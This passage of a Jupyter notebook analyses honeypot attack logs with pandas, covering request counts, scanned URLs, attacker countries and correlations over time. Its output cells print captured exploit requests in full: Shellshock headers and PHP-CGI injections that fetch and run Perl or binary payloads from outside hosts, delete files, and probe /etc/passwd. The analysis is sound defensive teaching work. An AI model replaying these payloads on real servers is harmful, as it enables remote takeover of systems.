# GET /cgi-sys/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/fire.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/bts.cgi HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "cd /tmp;wget http://100.42.30.34/lex ; curl -O http://100.42.30.34/lex ; perl lex ;rm -rf lex"    1
# GET /cgi-bin/meme.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET /phppath/php HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET /cgi-bin/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'    1
# GET /cgi-bin/recent.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/mzer.pl -O /tmp/mzer.pl;curl -O /tmp/mzer.pl http://202.191.121.230/mzer.pl;perl /tmp/mzer.pl;rm -rf /tmp/mzer.pl*");'    1
# GET /cgi-bin/bash HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/test-cgi.pl HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# POST //cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1\r\nContent-Length: 198\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: -c\r\n\r\n<? system("cd /tmp;wget http://svgold.ru/sekip/sekip.php;wget http://escoladeradio.com.br/website/wp-content/themes/radio/includes/new.txt;perl new.txt;rm -rf new.txt;rm -rf new.txt.*;rm -rf *"); ?>    1
# Length: 135, dtype: int64

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('\.\.')]['request_raw'].value_counts()
# Out:
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 160\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php\n system(" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd "); ?>    2
# GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3D../../../../../../../../../../../etc/passwd%00%20-n HTTP/1.1\r\nConnection: TE, close\r\nContent-Type: application/x-www-form-rlencoded\r\nHost: 54.68.96.53\r\nTe: deflate,gzip;q=0.3\r\nUser-Agent: Mozilla/5.0    1
# POST /comments HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-US,en;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nContent-Length: 51\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\r\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\r\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\r\n\r\ncomment=Ball+so+hard...that+shit+cray&submit=Submit    1
# dtype: int64

# %% [markdown]
# ### Timeseries Graphs (again)
#
# 1. Check out some of the timeseries graphs below, see if you can find any interesting patterns in the graphs/data.
# 2. Re-run the graphs and see what happens when you filter out the top talker from above.
#
# **Hint** remove the top talker from above by using the following code: *attacker_df = attacker_df[attacker_df['attackerIP'] != '']*.

# %%
import matplotlib.pyplot as plt

plt.plot(attacker_df['attackerIP'].resample("D", how='count'), label="Total Events")
plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    
plt.show()

# %%
for port in attacker_df['victimPort'].value_counts().index:
    if port < 10000:
        plt.plot(attacker_df[attacker_df == port]['victimPort'].resample("D", how='count'), label=port)
plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    
plt.show()

# %%
tempdf = attacker_df[attacker_df['channel'] != 'amun.events']
for port in tempdf['victimPort'].value_counts().index:
    plt.plot(tempdf[tempdf == port]['victimPort'].resample("D", how='count'), label=port)
plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    
plt.show()

# %%
for channel in attacker_df['channel'].value_counts().index:
    plt.plot(attacker_df[attacker_df['channel'] == channel]['channel'].resample("D", how='count'), label=channel)
plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    
plt.show()

# %%
for channel in attacker_df['channel'].value_counts().index:
    if channel != "amun.events":
        plt.plot(attacker_df[attacker_df['channel'] == channel]['channel'].resample("D", how='count'), label=channel)
plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    
plt.show()

# %% [markdown]
# ### Further Exploration
# It's possible to not only look at the top 20 countries hitting the honeypots, but other queries can be combined with the GeoIP info to get a different view on how information is laid out.

# %%
attacker_df['attackerCountry'].value_counts()[:20]
# Out:
# China                 77674
# United States         61459
# Russian Federation     7449
# France                 6587
# Taiwan                 6106
# Sweden                 5413
# Australia              5031
# Germany                3643
# Netherlands            3546
# Korea, Republic of     3376
# Singapore              2718
# Colombia               2580
# United Kingdom         2085
# Brazil                 1707
# Indonesia              1678
# Turkey                 1607
# Italy                  1329
# Poland                 1119
# India                  1106
# Argentina              1058
# dtype: int64

# %% [markdown]
# Below is a snapshot of all the countries that hit the honeypots with shellshock requests. What other types of queries can you think of?

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('};')]['attackerCountry'].value_counts()
# Out:
# Russian Federation    395
# Germany               128
# Sweden                 98
# China                  87
# Australia              20
# Brazil                 20
# United States          18
# Taiwan                 12
# Lithuania               3
# Singapore               2
# Turkey                  2
# India                   1
# Italy                   1
# dtype: int64

# %% [markdown]
# ### You can learn a lot from a URL
# One of the things you can learn from a URL is the types of vulnerabilites people are scanning for.
#
# 1. What types of vulnerabilites are scanners looking for?
# 2. How many requests for phpMyAdmin were there, and who's making them?

# %%
glastopf_df['request_url'].value_counts()
# Out:
# /                                                               1217
# /manager/html                                                    276
# /tmUnblock.cgi                                                   196
# /phpmyadmin/scripts/setup.php                                     74
# http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png      44
# /login.action                                                     35
# /index.action                                                     31
# /w00tw00t.at.blackhats.romanian.anti-sec:%29                      21
# /muieblackcat                                                     21
# /cgi-bin/test-cgi                                                 20
# http://6.url.cn/zc/chs/img/body.png                               19
# //web/phpMyAdmin/scripts/setup.php                                17
# //typo3/phpmyadmin/scripts/setup.php                              16
# /user/soapCaller.bs                                               15
# /etc/lib/pChart2/examples/index.php                               15
# ...
# /cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi    1
# /cgi-bin/boozt/admin/index.cgi                  1
# /cgi-sys/entropybanner.cgi                      1
# /struts.xml                                     1
# /phpMyAdmin-2.11.3/scripts/setup.php            1
# /phpMyAdmin-2.8.0.2/scripts/setup.php           1
# /phpMyAdmin-2.5.6-rc2/scripts/setup.php         1
# /print.cgi                                      1
# /sub%2A.php?panel=                              1
# /cgi-bin/gH.cgi                                 1
# /megabook/admin.cgi                             1
# /cgi-bin/cgi.cgi                                1
# /phpMyAdmin-2.8.0.4/scripts/setup.php           1
# /Select_Item.asp?id=                            1
# /phpMyAdmin-2.6.4-rc1/scripts/setup.php         1
# Length: 874, dtype: int64

# %%
len(glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['channel'].tolist())
# Out:
# 533

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['attackerIP'].unique()
# Out:
# array([u'198.12.87.152', u'104.192.103.3', u'101.69.247.10',
#        u'184.154.169.194', u'89.248.171.2', u'222.175.241.131',
#        u'69.174.245.163', u'69.175.60.90', u'175.122.253.28',
#        u'93.174.93.177', u'222.74.212.77', u'64.95.98.214',
#        u'182.245.121.169', u'69.85.92.62', u'198.154.63.131',
#        u'186.155.250.220', u'198.74.115.138', u'62.210.69.217',
#        u'89.46.100.144', u'94.102.49.11', u'62.210.247.154',
#        u'192.3.207.66', u'80.82.65.186'], dtype=object)

# %%
for ip in glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['attackerIP'].unique().tolist():
    print "%s - %s" %(ip, glastopf_df[glastopf_df['attackerIP'] == ip]['attackerCountry'].unique())
# Out:
# 198.12.87.152 - ['United States']
# 104.192.103.3 - [None]
# 101.69.247.10 - ['China']
# 184.154.169.194 - ['United States']
# 89.248.171.2 - ['Netherlands']
# 222.175.241.131 - ['China']
# 69.174.245.163 - ['United States']
# 69.175.60.90 - ['United States']
# 175.122.253.28 - ['Korea, Republic of']
# 93.174.93.177 - ['Netherlands']
# 222.74.212.77 - ['China']
# 64.95.98.214 - ['United States']
# 182.245.121.169 - ['China']
# 69.85.92.62 - ['United States']
# 198.154.63.131 - ['United States']
# 186.155.250.220 - ['Colombia']
# 198.74.115.138 - ['United States']
# 62.210.69.217 - ['France']
# 89.46.100.144 - ['Romania']
# 94.102.49.11 - ['Netherlands']
# 62.210.247.154 - ['France']
# 192.3.207.66 - ['United States']
# 80.82.65.186 - ['Netherlands']

# %% [markdown]
# ### Correlation over time
# This is a technique to determine if multiple countries are active across all the honeypots at/around the same time.
#
# Since we're just intersted in *attackerCountry*, a dataframe that contains just that data will be created for clarity.

# %%
plt.rcParams['figure.figsize'] = (10, 10)
subset = attacker_df[['attackerCountry']]
subset['count'] = 1
pivot = pd.pivot_table(subset, values='count', index=subset.index, columns=['attackerCountry'], fill_value=0)

# %% [markdown]
# Let's take a look at the 20 most active contries. Make sure to change the cell below to reflect this.

# %%
topN = subset['attackerCountry'].value_counts()[:20].index

# %% [markdown]
# Below illustrates how the correlation matrix can be graphed. The X and Y axis are sorted for ease of understanding/viewing of the data.

# %%
grouped = pivot.groupby([(lambda x: x.month), (lambda x: x.day)]).sum()
corr_df = grouped[topN].corr()

import statsmodels.api as sm

corr_df.sort(axis=0, inplace=True)
corr_df.sort(axis=1, inplace=True)
corr_matrix = corr_df.as_matrix()
sm.graphics.plot_corr(corr_matrix, ynames=corr_df.index.tolist(), xnames=corr_df.columns.tolist(), cmap='binary')
plt.show()

# %% [markdown]
# Next up, dig into the correlations a bit more. We can look at the behavior across honeypots over time by using the grouped information, and plotting it.
#
# Pick 4 countries from above that appear to be highly correlated (the squares where the countries meet are closer to black) and graph them.

# %%
print grouped[['France','Germany','Netherlands']].corr()
grouped[['France','Germany','Netherlands']].plot()
pylab.ylabel('Probes')
pylab.xlabel('Date Scanned')
# Out:
# attackerCountry    France   Germany  Netherlands
# attackerCountry
# France           1.000000  0.313773     0.362247
# Germany          0.313773  1.000000    -0.008637
# Netherlands      0.362247 -0.008637     1.000000

# %% [markdown]
# Pick some of the ones that appear to not be highly correlated, what does their graph look like?

# %%
print grouped[['France','Poland','Taiwan']].corr()
grouped[['France','Poland','Taiwan']].plot()
pylab.ylabel('Probes')
pylab.xlabel('Date Scanned')
# Out:
# attackerCountry    France   Germany  Netherlands    Taiwan
# attackerCountry
# France           1.000000  0.313773     0.362247 -0.243382
# Germany          0.313773  1.000000    -0.008637 -0.083837
# Netherlands      0.362247 -0.008637     1.000000 -0.100406
# Taiwan          -0.243382 -0.083837    -0.100406  1.000000
